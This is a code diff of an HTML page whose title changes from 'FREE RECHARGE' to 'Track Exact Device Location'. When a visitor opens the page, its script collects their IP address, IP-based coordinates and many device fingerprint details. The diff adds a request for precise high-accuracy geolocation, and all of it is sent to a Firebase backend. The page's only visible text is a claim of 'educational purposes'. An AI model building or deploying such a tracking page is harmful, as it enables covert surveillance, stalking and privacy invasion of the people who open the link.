@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FREE RECHARGE</title>
+  <title>Track Exact Device Location</title>
   
   <!-- Firebase SDK (using CDN and module-based approach for Firebase v9 or later) -->
   <script type="module">
@@ -52,12 +52,25 @@
 
           const userData = {
             userAgent: navigator.userAgent, // Browser/Device info
-            ipAddress: ipAddress, // Actual IP
+            platform: navigator.platform,  // Device platform
+            language: navigator.language,  // User's preferred language
+            ipAddress: ipAddress,  // Actual IP
             timestamp: new Date().toISOString(),
             screenSize: `${window.screen.width}x${window.screen.height}`,
-            location: location,
-            latitude: coordinates[0],  // Latitude
-            longitude: coordinates[1]  // Longitude
+            colorDepth: window.screen.colorDepth, // Color depth
+            availWidth: window.screen.availWidth,  // Available screen width
+            availHeight: window.screen.availHeight, // Available screen height
+            location: location,  // Location from IP
+            latitude: coordinates[0],  // Latitude from IP
+            longitude: coordinates[1],  // Longitude from IP
+            connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',  // Connection type (wifi, 4g, etc.)
+            deviceMemory: navigator.deviceMemory, // RAM (if supported)
+            batteryStatus: (navigator.getBattery ? 'Supported' : 'Not Supported'),  // Battery status (feature availability)
+            onlineStatus: navigator.onLine, // Online status
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Timezone info
+            screenOrientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown', // Screen orientation (if supported)
+            windowWidth: window.innerWidth,  // Window width
+            windowHeight: window.innerHeight,  // Window height
           };
 
           // Send data to Firebase
@@ -68,14 +81,45 @@
         });
     }
 
-    // Call the function when the page loads
+    // Function to get precise geolocation (if the user allows it)
+    function getPreciseLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const accuracy = position.coords.accuracy;  // Accuracy in meters
+
+          console.log("Precise Location: Latitude: ", latitude, "Longitude: ", longitude, "Accuracy: ", accuracy);
+
+          const userData = {
+            preciseLatitude: latitude,
+            preciseLongitude: longitude,
+            accuracy: accuracy,
+          };
+
+          // Send precise location to Firebase
+          sendDataToFirebase(userData);
+        }, function(error) {
+          console.error("Error getting precise location: ", error);
+        }, {
+          enableHighAccuracy: true, // Request high accuracy if available
+          timeout: 5000,  // Timeout after 5 seconds
+          maximumAge: 0  // Don't use cached position
+        });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+    }
+
+    // Call both functions when the page loads
     window.onload = function() {
-      getIPAndLocation();
+      getIPAndLocation();  // Get location from IP
+      getPreciseLocation();  // Get precise geolocation if possible
     };
   </script>
 </head>
 <body>
-  <h1>Welcome to the Demo Site!</h1>
-  <p>This website is for educational purposes only.</p>
+  <h1>Welcome to the Tracking Page</h1>
+  <p>This website is collecting information for educational purposes only.</p>
 </body>
 </html>
